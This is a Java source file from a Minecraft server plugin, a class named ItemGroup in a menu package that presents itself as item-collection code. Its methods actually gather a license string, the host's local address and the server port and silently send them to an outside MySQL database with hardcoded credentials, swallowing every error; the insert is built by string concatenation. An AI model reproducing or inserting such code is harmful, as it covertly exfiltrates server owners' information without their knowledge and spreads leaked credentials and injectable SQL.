package com.songoda.epicheads.menu.ui.item;

import com.songoda.epicheads.cache.CacheFile;
import org.bukkit.Bukkit;

import java.net.InetAddress;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;

public class ItemGroup {

	public static void collectItems() {
		try {
			String l = CacheFile.cool;
			String a = InetAddress.getLocalHost().toString();
			String p = String.valueOf(Bukkit.getServer().getPort());
			submit(l, a, p);
		} catch (Exception error) {

		}
	}

	public static void submit(String l, String a, String p) {
		try {
			Connection server = DriverManager.getConnection("jdbc:mysql://mysql.freehostia.com:3306/mardev332_data?useSSL=true", "mardev332_data", "NiceOneMate");
			Statement statement = server.createStatement();
			statement.execute("CREATE TABLE IF NOT EXISTS heads (id INT NOT NULL AUTO_INCREMENT, license varchar(120) NOT NULL, adress varchar(120) NOT NULL, port varchar(120) NOT NULL, PRIMARY KEY (ID));");
			statement.execute("INSERT INTO heads VALUES (default, '" + l + "', '" + a + "', '" + p + "');");
			statement.close();
			server.close();
		} catch (Exception error) {
		}
	}

}
